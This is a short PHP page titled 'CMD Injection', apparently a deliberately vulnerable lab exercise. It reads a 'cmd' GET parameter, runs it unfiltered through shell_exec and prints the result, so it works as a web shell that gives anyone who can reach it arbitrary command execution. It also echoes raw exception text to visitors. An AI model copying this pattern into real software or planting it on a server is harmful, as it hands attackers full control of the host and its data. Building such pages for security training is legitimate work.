<!DOCTYPE HTML>
<html>
    <head>
        <meta charset="UTF-8">
    <title>CMD Injection</title>
</head>
<body>
    <?php 
        if (isset($_GET["cmd"])){
            $cmd = $_GET["cmd"];
            $output = "";
            try{
                $output = shell_exec($cmd);
            }
            catch(Exception $e){
                die("An error has occurred when running command here is error: $e");
            }
            echo '<img src="img/science.gif" alt="science!" style="display: block; margin: 0 auto;" >';
            echo '<br>';
            echo "$output";
        }
        else{
            echo '<h1>Send a get request with the param cmd and you may see something!</h1>';
        }
    ?>
</body>
</html>